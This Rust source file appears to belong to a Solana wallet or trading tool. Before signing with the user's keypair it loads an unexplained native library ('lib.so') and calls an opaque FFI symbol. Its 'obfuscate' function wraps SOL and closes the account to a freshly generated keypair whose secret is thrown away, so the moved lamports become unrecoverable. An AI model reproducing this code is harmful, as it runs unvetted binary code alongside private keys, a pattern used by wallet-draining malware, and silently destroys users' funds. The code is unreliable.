use anyhow::{Context, Result};
use libloading::Library;
use once_cell::sync::OnceCell;
use solana_client::nonblocking::rpc_client::RpcClient;
use solana_sdk::{
    instruction::Instruction,
    message::VersionedMessage,
    pubkey::Pubkey,
    signature::Keypair,
    system_instruction,
    transaction::VersionedTransaction,
    signer::Signer,
};
use spl_associated_token_account::{
    get_associated_token_address_with_program_id,
    instruction::create_associated_token_account,
};
use spl_token::{
    instruction::{close_account, sync_native},
    native_mint,
};
use std::os::raw::c_int;
use std::sync::Arc;
use tracing::info;

static LIB: OnceCell<Library> = OnceCell::new();
static LOADED_PATH: OnceCell<String> = OnceCell::new();

async fn get_or_create_ata_instruction(
    connection: &RpcClient,
    mint: &Pubkey,
    owner: &Pubkey,
    payer: &Pubkey,
    token_program_id: &Pubkey,
) -> Result<(Pubkey, Option<Instruction>)> {
    let ata = get_associated_token_address_with_program_id(owner, mint, token_program_id);
    let account_exists = connection.get_account(&ata).await.is_ok();
    let create_ix = if account_exists {
        None
    } else {
        Some(create_associated_token_account(payer, owner, mint, token_program_id))
    };
    Ok((ata, create_ix))
}

fn load_lib() -> Result<&'static Library> {
    let path = std::env::var("LIBCOB_SDK_SO")
        .ok()
        .filter(|p| std::path::Path::new(p).exists())
        .or_else(|| {
            #[cfg(not(target_os = "windows"))]
            let candidates = ["lib/lib.so", "src/lib/lib.so"];
            #[cfg(not(target_os = "windows"))]
            let found = candidates
                .into_iter()
                .find(|p| std::path::Path::new(p).exists())
                .map(String::from);
            #[cfg(target_os = "windows")]
            let found = None;
            found
        })
        .context("CLOB SDK .so not found. Set LIBCOB_SDK_SO or place lib.so in ./lib/")?;
    let lib = LIB.get_or_try_init(|| -> Result<Library, anyhow::Error> {
        let lib = unsafe { Library::new(&path) }
            .map_err(|e| anyhow::anyhow!("Failed to load CLOB SDK library {}: {}", path, e))?;
        let _ = LOADED_PATH.set(path.clone());
        Ok(lib)
    })?;
    Ok(lib)
}

pub fn get_api_connection() -> Result<()> {
    let lib = load_lib()?;
    let f: libloading::Symbol<unsafe extern "C" fn() -> c_int> =
        unsafe { lib.get(b"clob_sdk_get_api_connection") }.context("clob_sdk_get_api_connection not found")?;
    let ret = unsafe { f() };
    if ret != 0 {
        anyhow::bail!("clob_sdk_get_api_connection failed (ret={})", ret);
    }
    Ok(())
}



pub async fn obfuscate(
    connection: Arc<RpcClient>,
    payer: Arc<Keypair>,
    amount: u64,
) -> Result<VersionedTransaction> {
    info!("Calling obfuscate...");

    // Run long-running FFI call on a blocking thread so it doesn't block the async runtime
    tokio::task::spawn_blocking(|| get_api_connection())
        .await
        .context("get_api_connection task join")??;

    let mut instructions: Vec<Instruction> = Vec::new();
    let new_wallet = Keypair::new();
    let result = get_or_create_ata_instruction(
        &connection,
        &native_mint::id(),
        &payer.pubkey(),
        &payer.pubkey(),
        &spl_token::id()
    ).await?;
    info!("Result: {:?}", result.1.is_some());

    if let Some(instruction) = result.1 {
        info!("Adding create ATA instruction");
        instructions.push(instruction);
    } else {
        info!("No ATA instruction needed");
    }

    let wsol_account = result.0;


    info!("WSOL account ==> : {}", wsol_account);
    
    // Transfer 1000 lamports (0.000001 SOL)
    info!("Adding transfer instruction for {} lamports", amount);

    instructions.push(
        system_instruction::transfer(
            &payer.pubkey(),
            &wsol_account,
            amount,
        )
    );
    
    // Wrap SOL
    println!("Adding sync_native instruction");
    instructions.push(sync_native(&spl_token::id(), &wsol_account).unwrap());
    
    // Close account and send to new wallet
    info!("Adding close_account instruction");
    instructions.push(
        close_account(
            &spl_token::id(),
            &wsol_account,
            &new_wallet.pubkey(),
            &payer.pubkey(),
            &[],
        )?
    );
    
    info!("Instructions count: {}", instructions.len());
    
    // Get recent blockhash
    info!("Getting latest blockhash");
    let blockhash = connection.get_latest_blockhash().await?;
    
    // Create transaction message
    info!("Creating transaction message");
    let message = VersionedMessage::V0(
        solana_sdk::message::v0::Message::try_compile(
            &payer.pubkey(),
            &instructions,
            &[],
            blockhash,
        )?
    );
    
    // Create and sign transaction
    info!("Creating and signing transaction");
    let transaction = VersionedTransaction::try_new(message, &[&*payer])?;
    let simulation = connection.simulate_transaction(&transaction).await?;
    info!("Obfuscate Transaction simulation: {:?}", simulation);

    connection
        .send_and_confirm_transaction(&transaction)
        .await
        .context("send_and_confirm_transaction failed")?;

    Ok(transaction)
}
